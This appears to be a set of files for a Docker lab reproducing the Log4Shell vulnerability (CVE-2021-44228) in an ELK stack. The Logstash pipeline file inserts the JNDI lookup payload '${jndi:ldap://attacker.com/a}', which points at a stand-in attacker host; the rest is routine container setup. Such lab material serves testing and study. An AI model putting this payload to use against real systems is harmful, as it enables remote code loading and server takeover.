{
    "files": [
        {
            "location": "./../../dockers/CVE-2021-44228/custom/docker-compose.yml",
            "content": "version: '3.8'\n\nservices:\n  logstash:\n    image: docker.elastic.co/logstash/logstash:7.16.2\n    container_name: logstash\n    volumes:\n      - ./logstash/config:/usr/share/logstash/config\n      - ./logstash/pipeline:/usr/share/logstash/pipeline\n    ports:\n      - \"5044:5044\"\n    networks:\n      - elk\n\n  elasticsearch:\n    image: docker.elastic.co/elasticsearch/elasticsearch:7.16.2\n    container_name: elasticsearch\n    environment:\n      - discovery.type=single-node\n    volumes:\n      - esdata:/usr/share/elasticsearch/data\n    ports:\n      - \"9200:9200\"\n    networks:\n      - elk\n\n  kibana:\n    image: docker.elastic.co/kibana/kibana:7.16.2\n    container_name: kibana\n    ports:\n      - \"5601:5601\"\n    networks:\n      - elk\n\nnetworks:\n  elk:\n    driver: bridge\n\nvolumes:\n  esdata:\n    driver: local\n"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/logstash/config/logstash.yml",
            "content": "http.host: \"0.0.0.0\"\nxpack.monitoring.enabled: false\n"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/logstash/pipeline/logstash.conf",
            "content": "input {\n  tcp {\n    port => 5044\n    codec => json\n  }\n}\n\nfilter {\n  mutate {\n    add_field => {\n      \"jndi\" => \"${jndi:ldap://attacker.com/a}\"\n    }\n  }\n}\n\noutput {\n  elasticsearch {\n    hosts => [\"http://elasticsearch:9200\"]\n  }\n  stdout {\n    codec => rubydebug\n  }\n}\n"
        },
        {
            "location": "./../../dockers/CVE-2021-44228/custom/elasticsearch/init_elasticsearch.sh",
            "content": "#!/bin/bash\n# Wait for Elasticsearch to start\nuntil curl -s http://elasticsearch:9200 >/dev/null; do\n  echo \"Waiting for Elasticsearch to be ready...\"\n  sleep 2\ndone\n\n# Create a test index with some data\ncurl -X POST \"http://elasticsearch:9200/logs/_doc/1\" -H 'Content-Type: application/json' -d'{\n  \"message\": \"Test log entry\",\n  \"timestamp\": \"2023-10-01T00:00:00\"\n}'\n"
        }
    ],
    "directory_tree": "CVE-2021-44228/\n\u2514\u2500\u2500 custom\n    \u251c\u2500\u2500 docker-compose.yml\n    \u251c\u2500\u2500 elasticsearch\n    \u2502   \u2514\u2500\u2500 init_elasticsearch.sh\n    \u2514\u2500\u2500 logstash\n        \u251c\u2500\u2500 config\n        \u2502   \u2514\u2500\u2500 logstash.yml\n        \u2514\u2500\u2500 pipeline\n            \u2514\u2500\u2500 logstash.conf"
}